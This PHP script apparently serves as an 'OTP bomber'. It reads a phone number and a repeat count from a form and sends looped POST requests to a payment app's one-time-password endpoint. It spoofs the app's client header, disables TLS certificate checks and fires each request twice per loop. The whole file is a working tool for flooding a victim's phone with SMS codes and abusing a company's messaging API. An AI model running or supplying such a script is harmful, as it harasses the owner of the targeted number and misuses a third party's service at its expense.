<?php

$jum = $_POST["no"];
$body = '{"msisdn": "+'.$jum.'"}';
$loop = $_POST["loop"];
for($i = 0; $i <= $loop; $i++) {
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://customerapp.paypro.id/v2/otp");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, array("Host: customerapp.paypro.id","Content-Type: application/json; charset=UTF-8","Accept-Encoding: gzip","Connection: Keep-Alive","User-Agent: okhttp/3.9.0"));
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
echo "Success Nganu <br> $body <br>";
$result = curl_exec($ch);
if(curl_exec($ch)){
    continue;
    }
}

?>